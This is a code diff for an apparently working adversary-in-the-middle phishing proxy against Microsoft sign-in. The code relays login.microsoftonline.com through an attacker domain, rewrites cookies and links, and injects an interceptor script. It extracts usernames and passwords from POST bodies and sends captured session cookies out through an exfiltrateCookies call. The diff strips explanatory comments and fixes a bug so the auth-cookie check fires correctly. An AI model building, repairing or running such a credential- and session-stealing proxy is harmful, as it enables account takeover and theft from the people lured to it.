@@ -112,26 +112,16 @@ function cleanQueryString(search) {
 
 // ==================== ADVANCED URL PARSER (NO BLOCKING) ====================
 
-/**
- * Parse any URL format including recursive/nested ones
- * Returns the real upstream and path, handling:
- * - /_p/microsoft.com/path
- * - /_p/yourdomain.com/_p/microsoft.com/path
- * - /_p/yourdomain.com/_p/microsoft.com/https:/yourdomain.com/kmsi
- */
 function parseUrl(pathname, search) {
   console.log(`[PARSE] Input: ${pathname}`);
   
-  // Remove leading slash
   let path = pathname.startsWith('/') ? pathname.slice(1) : pathname;
   
-  // Pattern to match _p segments
   const segmentPattern = /^_p\/([^\/]+)(\/.*)?$/;
   
   let segments = [];
   let remaining = path;
   
-  // Extract all _p segments
   while (remaining) {
     const match = remaining.match(segmentPattern);
     if (!match) break;
@@ -145,30 +135,23 @@ function parseUrl(pathname, search) {
   
   console.log(`[PARSE] Found ${segments.length} segments:`, segments.map(s => s.domain));
   
-  // Find the first valid upstream (not our domain)
-  // OR if all are our domain, use the path as-is (it's a post-login redirect)
   let upstreamDomain = null;
   let upstreamPath = '/';
   let isProxied = false;
   
   for (const segment of segments) {
-    // Skip our domain in the chain - it's just a redirect marker
     if (segment.domain === YOUR_DOMAIN || segment.domain.endsWith(YOUR_DOMAIN)) {
       console.log(`[PARSE] Skipping self-domain: ${segment.domain}`);
       continue;
     }
     
-    // Found a real upstream
     upstreamDomain = segment.domain;
     upstreamPath = segment.path || '/';
     isProxied = true;
     break;
   }
   
-  // If no upstream found (all segments were our domain), this is a post-login path
   if (!upstreamDomain) {
-    // Check if the remaining path has an embedded URL
-    // e.g., /common/https:/ayola-ozamu.zeabur.app/kmsi
     const embeddedMatch = path.match(/.*\/https?:\/?\/?([^\/]+)(.*)/);
     
     if (embeddedMatch) {
@@ -177,19 +160,13 @@ function parseUrl(pathname, search) {
       
       console.log(`[PARSE] Embedded URL found: host=${embeddedHost}, path=${embeddedPath}`);
       
-      // If embedded host is us, this is Microsoft redirecting to us
-      // We need to determine the real Microsoft upstream from context or default
       if (embeddedHost === YOUR_DOMAIN || embeddedHost.endsWith(YOUR_DOMAIN)) {
-        // This is a post-login redirect to our domain
-        // The upstream should be determined from the path context
-        // e.g., /common/https:/... usually comes from login.microsoftonline.com
-        upstreamDomain = 'login.microsoftonline.com'; // Default for auth flows
+        upstreamDomain = 'login.microsoftonline.com';
         upstreamPath = embeddedPath;
         isProxied = true;
         console.log(`[PARSE] Post-login redirect detected, using ${upstreamDomain}`);
       }
     } else {
-      // Pure self-domain request - treat as root
       console.log(`[PARSE] Pure self request, serving default upstream`);
       return {
         upstream: INITIAL_UPSTREAM,
@@ -233,10 +210,7 @@ function rewriteLocation(location, currentUpstream) {
     
     console.log(`[REWRITE] Location: ${location}, currentUpstream: ${currentUpstream}`);
     
-    // Already our domain
     if (url.hostname === YOUR_DOMAIN || url.hostname.endsWith(`.${YOUR_DOMAIN}`)) {
-      // Check for embedded Microsoft path in our domain URL
-      // Microsoft sometimes does: https://yourdomain.com/common/https://microsoft.com/path
       const doubleHttpMatch = url.pathname.match(/(.*)\/https?:\/?\/?([^\/]+)(.*)/);
       
       if (doubleHttpMatch) {
@@ -244,7 +218,6 @@ function rewriteLocation(location, currentUpstream) {
         const msPath = doubleHttpMatch[3] || '/';
         
         if (shouldProxyDomain(msHost)) {
-          // Reconstruct: proxy the Microsoft part
           const result = `https://${YOUR_DOMAIN}${PROXY_PREFIX}${msHost}${msPath}${url.search}`;
           console.log(`[REWRITE] Double-http rewrite: ${result}`);
           return result;
@@ -255,7 +228,6 @@ function rewriteLocation(location, currentUpstream) {
       return location;
     }
     
-    // External domain - proxy it
     if (shouldProxyDomain(url.hostname)) {
       const result = `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${cleanQueryString(url.search)}`;
       console.log(`[REWRITE] Proxy external: ${result}`);
@@ -266,11 +238,9 @@ function rewriteLocation(location, currentUpstream) {
     return location;
     
   } catch (e) {
-    // Relative URL or malformed
     console.log(`[REWRITE] Relative/malformed: ${location}`);
     
     if (location.startsWith('/') && currentUpstream) {
-      // Check for embedded protocol
       const embeddedMatch = location.match(/(.*)\/https?:\/?\/?([^\/]+)(.*)/);
       
       if (embeddedMatch) {
@@ -282,7 +252,6 @@ function rewriteLocation(location, currentUpstream) {
         }
         
         if (embeddedHost === YOUR_DOMAIN) {
-          // Embedded self-reference, continue with current upstream
           return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${currentUpstream}${embeddedPath}`;
         }
       }
@@ -300,14 +269,14 @@ function isAuthUrl(path) {
   return AUTH_URLS.some(authPath => path.toLowerCase().includes(authPath.toLowerCase()));
 }
 
-function hasAuthCookies(cookieString, upstream) {
-  if (!cookieString) return false;
+function hasAuthCookies(cookieStr, upstream) {
+  if (!cookieStr) return false;
   
   const patterns = AUTH_TOKENS[upstream] || AUTH_TOKENS['login.microsoftonline.com'] || [];
   
   return patterns.some(pattern => {
     const regex = new RegExp(pattern, 'i');
-    return regex.test(cookieString);
+    return regex.test(cookieStr);
   });
 }
 
@@ -315,7 +284,6 @@ function parseCredentials(bodyText) {
   let user = null, pass = null;
   if (!bodyText) return { user, pass };
   
-  // Try JSON first
   try {
     const jsonData = JSON.parse(bodyText);
     user = jsonData.username || jsonData.email || jsonData.user || jsonData.login || jsonData.UserName;
@@ -323,7 +291,6 @@ function parseCredentials(bodyText) {
     if (user && pass) return { user, pass };
   } catch (e) {}
   
-  // Try form data
   const params = new URLSearchParams(bodyText);
   const userFields = ['login', 'loginfmt', 'username', 'email', 'user', 'UserName'];
   const passFields = ['passwd', 'password', 'pwd', 'pass', 'Password'];
@@ -364,7 +331,6 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
         if(h&&r('https://'+h)!==u)return'https://'+D+P+h+u.slice(2+h.length)
       }
       if(u.startsWith('/')){
-        // Handle embedded URLs in path
         const emb=u.match(/(.*)\\/https?:\\/?\\/?([^\\/]+)(.*)/);
         if(emb){
           if(emb[2]===D){
@@ -455,7 +421,6 @@ export default async function handleRequest(request) {
     return new Response('Access denied.', { status: 403 });
   }
 
-  // Parse URL without any blocking
   const info = parseUrl(url.pathname, url.search);
   
   const upstreamDomain = info.upstream;
@@ -464,7 +429,6 @@ export default async function handleRequest(request) {
   const isAuthEndpoint = isAuthUrl(info.path);
   console.log(`[${info.type}] ${request.method} ${url.pathname} -> ${upstreamUrl}${isAuthEndpoint ? ' [AUTH]' : ''}`);
 
-  // Prepare request headers
   const headers = new Headers();
   const clientHeaders = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'cookie', 'referer', 'origin', 'x-requested-with'];
   
@@ -488,7 +452,6 @@ export default async function handleRequest(request) {
   let bodyText = null;
   let requestBody = null;
 
-  // Handle credential extraction for POST requests
   if (['POST', 'PUT', 'PATCH'].includes(request.method)) {
     try {
       const cloned = request.clone();
@@ -547,8 +510,8 @@ export default async function handleRequest(request) {
     if (cookies?.length) {
       cookieStr = cookies.join('; ');
       
-      // Check if this is an auth response
-      const hasAuth = hasAuthCookies(cookieString, upstreamDomain);
+      // CRITICAL FIX: Use cookieStr (not cookieString)
+      const hasAuth = hasAuthCookies(cookieStr, upstreamDomain);
       const isPostLogin = request.method === 'POST' && (info.path.includes('/login') || info.path.includes('/ProcessAuth'));
       const isAuthRedirect = resp.status === 302 && isAuthUrl(info.path);
       
@@ -562,19 +525,16 @@ export default async function handleRequest(request) {
         
         let modifiedCookie = cookie;
         
-        // Replace domain in cookie
         modifiedCookie = modifiedCookie.replace(
           new RegExp(`domain=${upstreamDomain.replace(/\./g, '\\.')}`, 'gi'),
           `domain=${YOUR_DOMAIN}`
         );
         
-        // Replace upstream domain in path/value if present
         modifiedCookie = modifiedCookie.replace(
           new RegExp(upstreamDomain.replace(/\./g, '\\.'), 'g'),
           `${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}`
         );
         
-        // Ensure Secure and SameSite
         if (!modifiedCookie.toLowerCase().includes('secure')) modifiedCookie += '; Secure';
         if (!modifiedCookie.toLowerCase().includes('samesite')) modifiedCookie += '; SameSite=None';
         
@@ -588,16 +548,13 @@ export default async function handleRequest(request) {
       await exfiltrateCookies(cookieStr, ip, info.type, url.href);
     }
 
-    // Create response headers
     const responseHeaders = createResponseHeaders(resp, { setCookies: modifiedCookies });
 
-    // Process body for HTML/JS/CSS
     const ct = resp.headers.get('content-type') || '';
     
     if (/text\/html|application\/javascript|application\/json|text\/css/.test(ct)) {
       let text = await resp.text();
       
-      // Inject interceptor script for HTML
       if (ct.includes('text/html')) {
         const script = generateInterceptorScript(upstreamDomain, info.path);
         text = text.replace('<head>', '<head>' + script)
@@ -605,27 +562,22 @@ export default async function handleRequest(request) {
         if (!text.includes(script)) text = script + text;
       }
 
-      // Rewrite all upstream domains in content
       Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
         const replacement = `${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`;
         text = text.split(domain).join(replacement);
       });
 
-      // Handle relative paths in HTML
       if (ct.includes('text/html')) {
         const currentDir = info.path.replace(/\/[^\/]*$/, '/');
         
-        // src/href attributes
         text = text.replace(/(src|href)="\/([^"]*)"/gi, (m, attr, path) => {
           if (path.startsWith('_p/') || path.startsWith('data:')) return m;
           return `${attr}="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path}"`;
         });
         
-        // Form actions
         text = text.replace(/action="\/([^"]*)"/gi, `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$1"`);
         text = text.replace(/action="(?!\/|https?:|#|data:)([^"]*)"/gi, `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}${currentDir}$1"`);
         
-        // CSS url()
         text = text.replace(/url\(["']?\/([^"')]+)["']?\)/gi, (m, path) => {
           if (path.startsWith('_p/')) return m;
           return `url(https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path})`;
@@ -635,7 +587,6 @@ export default async function handleRequest(request) {
       return new Response(text, { status: resp.status, headers: responseHeaders });
     }
 
-    // Binary/streaming response
     return new Response(resp.body, { status: resp.status, headers: responseHeaders });
 
   } catch (err) {
